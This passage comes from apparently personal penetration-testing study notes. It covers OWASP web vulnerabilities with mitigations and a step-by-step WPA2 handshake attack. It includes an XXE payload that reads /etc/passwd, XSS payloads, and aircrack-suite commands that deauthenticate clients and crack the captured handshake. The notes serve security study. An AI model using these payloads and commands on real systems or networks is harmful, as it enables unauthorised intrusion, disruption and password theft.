</code></pre><h3 id="b1272c49-a8aa-4447-860a-d1787a2107f7" class=""><strong>Discover</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#discover"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cbdf3dc8-82e4-4757-8c70-31d6c7f8d608" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># To discover files that not should have been exposed first of all we need a good enumeration
# Find directories with web crawling: gobuster, dirb, dirsearch, ffuf, etc
# Dig in responses of the requests in burp
# Scan headers with: https://securityheaders.com/

nmap --script=ssl-enum-ciphers -p 443 &lt;domain&gt;
</code></pre><h3 id="bf815e7f-1096-4caf-8bfd-f8b3a9cbc450" class=""><strong>XML External Entities</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#xml-external-entities"></a></strong></h3><p id="ba726012-c14b-42b5-9239-6eed9e0ce637" class="">Attack systems that parse XML imput</p><p id="6c86bcaa-d839-4711-bf3c-eb301ef0e0aa" class="">example.xml</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="779bfb37-46b4-4bf5-8636-6a60e35b75df" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
  &lt;!DOCTYPE foo [
  &lt;!ELEMENT foo any &gt;
  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</code></pre><h3 id="90e6a395-326b-49ae-b0d3-9621c1e66046" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-5"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="705af32d-3df9-4286-b374-a618c18873d0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Disable the external entities in XML files
</code></pre><h3 id="d3b4ca68-be6d-425d-aea5-100b8a25b36b" class=""><strong>Broken Access Control</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#broken-access-control"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f791a106-f6dc-40ce-b5af-b23e8e600fbb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">User get access to somewhere they should not
example: access an admin panel without the credentials
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a531cbdb-b531-408b-86b2-35b5338373d8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Bypass broken access in inspect element, delete hidden=&quot;&quot;
- Change type: password to type: text to show passwords in clear text
</code></pre><h3 id="cc8a2195-2839-4d0d-a3cd-662c0697bee7" class=""><strong>Security Misconfiguration</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#security-misconfiguration"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dd01fb32-2f24-4f9f-9967-2126a03f6d82" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Default credentials
Improperly configured permissions
Unnecessary features, ports, services, pages, accounts, etc
</code></pre><h3 id="feda5e34-da25-4b83-befa-66a6e1a5f8f1" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-6"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d39e523b-4472-404d-afba-52e7454ee943" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Security Headers
- ACLs
- Do not have any unnecessary features, components, etc
</code></pre><h3 id="5b382710-59ef-46bf-ae8a-1d7c211b475d" class=""><strong>Cross-Site Scripting (XSS)</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#cross-site-scripting-xss"></a></strong></h3><p id="ce79f9fe-8360-47f5-b68b-215b97c95162" class="">Reflected:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="824af53d-4cfb-430f-8d50-278646c2b33a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">after inserting something malicious, its gonna reflect back to us
example &lt;script&gt; alert(0) &lt;/script&gt;
</code></pre><p id="74dadc9c-7161-465d-b54c-84a4df440767" class="">Stored:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c00e605b-e541-4779-88b1-23d896afdb53" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">The malicious code gets stored into the server
</code></pre><p id="bc64331f-9bcf-4504-8532-af71ea08021c" class="">DOM:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d40ed9b4-9c64-4af4-a859-169209243a9f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Document object model - javascript
its client side like reflected xss.
example: &lt;iframe src=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;
</code></pre><h3 id="8a638deb-f0c2-45a3-b687-f6fa60fbfe3e" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-7"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9d1c8d9e-aeaa-4273-84d9-2f2463fe122b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Encoding: &#x27;&lt;&#x27; becomes &amp;lt;  &lt;script&gt; becomes &amp;lt;script&gt;
- Filtering: &lt;script&gt; becomes script
- Validating: compare input against white list
- Sanitization: combination of escaping, filtering and validation
</code></pre><h3 id="45478394-868f-4f6b-a472-b13192c2ffa6" class=""><strong>Insecure Deserialization</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#insecure-deserialization"></a></strong></h3><p id="caf2af0a-4cb3-4e1c-a44b-cc7c0973032d" class="">We can send malicious data serialized and the application will deserialize and execute</p><h3 id="b53f8867-e01e-45d0-b079-5d2824c6c183" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-8"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="65c79f82-2d49-41b3-8794-49800c64a515" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Monitoring deserialization
- Enforcing strict type contraints during deserialization
- Implement digital signatures
</code></pre><h3 id="c0f5f404-5eb2-4bf6-871a-025fdaf403b2" class=""><strong>Using components with Known vulnerabilities</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#using-components-with-known-vulnerabilities"></a></strong></h3><p id="2a1a87e0-f9d6-493a-a41a-cad37d09d4ca" class="">Using out-dated applications, unsupported or vulnerable</p><h3 id="c206270b-9ef5-471f-9f19-5cfa65639c79" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-9"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d9b3426f-1057-4511-a82f-d760c7ff3e44" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Update old applications, services, etc
- Keep inventory of versions of both client-side and server-side components
- Remove unused dependencies, unnecessary features, components, files and documentation

</code></pre><h3 id="735a46df-9910-4c4c-b7a9-436ea62adffd" class=""><strong>Insufficient Logging and Monitoring</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#insufficient-logging-and-monitoring"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e5877322-55f9-4953-b867-ef03a0cdb510" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Auditable events, such as logins, failed logins
uncler logs
unable to detect or alert for active attacks in real time or near real time
</code></pre><h3 id="4cef9ea6-6257-4da2-9d07-c019dfaf4f4d" class=""><strong>Mitigation</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#mitigation-10"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8f4c32b8-9d39-4aef-b727-623b09eb38b0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Ensure all login, access control failures and server-side input validation
- Ensure that logs are generated in a format that can be easily consumed
- Establish effective monitoring and alerting suspicious activities
- Establish an incident responde and recovery plan
</code></pre><h1 id="e914a90f-7232-4bf6-ae7d-99e555706b6b" class=""><strong>Wireless Penetration Testing</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#wireless-penetration-testing"></a></strong></h1><h2 id="11ea2c4d-f9ee-44df-9944-1050a899f3b2" class=""><strong>Assessment of wireless network</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#assessment-of-wireless-network"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aafdce9f-9248-4990-9110-6224c240bbb6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">WPA2 PSK (pre share key)
WPA2 Enterprise
</code></pre><h3 id="6e16a257-8796-40a8-b48d-fdf141059c0c" class=""><strong>Activities performed</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#activities-performed"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0321e172-efd8-4af1-ba13-2ffbd34eeaa6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Evaluating strength of PSK
Reviewing nearby networks
Assessing guest networks
Checking network access
</code></pre><h3 id="5938bd6c-983a-482c-b252-857c9055fbbb" class=""><strong>Tools</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#tools"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2ad34bba-ac63-46d6-87eb-46edfbe37713" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Wireless card
Router
Laptop
</code></pre><h3 id="e0c00a2c-ccc2-4205-a50e-3d6053064803" class=""><strong>Process of attack - WPA2 PSK</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#process-of-attack---wpa2-psk"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a8e8ba09-a8a8-421e-b32e-b189a30e45fd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Place &gt; Discover &gt; Select &gt; Perform &gt; Capture &gt; Attemp

- Place wireless card into monitor mode
- Discover information about network
	channel / BSSID (mac address)

- Select network and capture data
- Perform deauth attack
- Capture WPA handshake
- Attemp to crack the handshake
</code></pre><h2 id="e857e2c1-864c-44c0-9dca-56e2046ad095" class=""><strong>WPA_PS2_Exploit</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#wpa_ps2_exploit"></a></strong></h2><p id="2dd90910-3db0-4533-b802-71add2fbe512" class="">Connect the wireless card:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9b93e051-eec2-4f10-a251-ab0b7dd7a900" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">if you are using VM
  Player &gt; removable devices &gt; card &gt; connect
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="492cbf34-e505-47f4-a43d-f045f8750641" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">iwconfig # to show wireless connections
airmon-ng check kill # check and kill processes that will interfere in our scope
airnon-ng start wlan0 # start monitor mode
airodump-ng wlan0mon # to show possible targets in the area
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="34e2f800-b2f2-4f3a-89dc-2deaa5ecbaab" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">BSSID # mac address of the access point
PWR # power level, lower the number close we are to the device
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7473215a-145f-4125-801a-076a1e1fee90" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">airodump-ng -c &lt;channel&gt; --bssid &lt;mac address of target&gt; -w &lt;file name&gt; wlan0mon (our w_interface)
</code></pre><blockquote id="7172654c-9cdd-4156-873b-a68e7e96bac3" class="">now we wait for the WPA handshake, we can accelerate this proccess by deauth the users from their network</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="38449966-3542-488d-99f4-7b982274c5ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">aireplay-ng -0 (means deauth) 1 (number of times we are gonna run) -a &lt;mac address of target&gt; -c &lt;station mac address&gt; wlan0mon (our interface)
</code></pre><blockquote id="9aae8ca3-f6a8-4e4e-896b-06f054affedb" class="">sometimes its necessary to run a couple of times, against differents users</blockquote><p id="a80522fa-a41a-4b44-8c3f-d8d49373dcf6" class="">After getting the WPA handshake:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4b839a73-8d13-41b9-b398-0cc33504d9fe" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ls capture*
	show the .cap file
</code></pre><h3 id="e06524e4-e594-4ba5-84f6-292d2ee9bd3e" class=""><strong>crack the handshake wpa:</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#crack-the-handshake-wpa"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ca876f16-48a3-412d-bb65-a746964c81d1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">aircrack-ng -w &lt;wordlist&gt; -b &lt;mac address of target&gt; &lt;the .cap file&gt;
# we can try to crack with hashcat too
